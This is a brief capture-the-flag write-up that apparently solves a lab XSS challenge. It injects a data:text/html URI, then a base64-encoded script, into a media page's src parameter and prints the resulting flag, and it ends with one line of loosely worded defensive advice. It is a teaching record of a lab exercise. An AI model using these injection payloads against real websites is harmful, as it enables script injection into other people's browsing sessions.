# NSA XSS Injection

### Tools
Developer Tools from web browser

### How to solve it

1. Firt we access the nsa page and check that it has a address where we can try to run some script
2. http://10.0.0.155/?page=media&src=nsa
3. Then we exchange the nsa for this <script>alert("xss")</script> and this doesnt work because we have to put the prefix data:text/html to execute scripts.
4. Then we try : data:text/html,<script>alert("42")</script> and Boom it works but no flag is given
5.  So now we are close, we just have to change the base to 64 so we convert the script code to base 64 and run again.
6.  http://10.0.0.155/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnNDInKTs8L3NjcmlwdD4=
7.  And then it gives the flag: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
### How to protect it

Input invalidation is the best way to protect against it and data encoding.

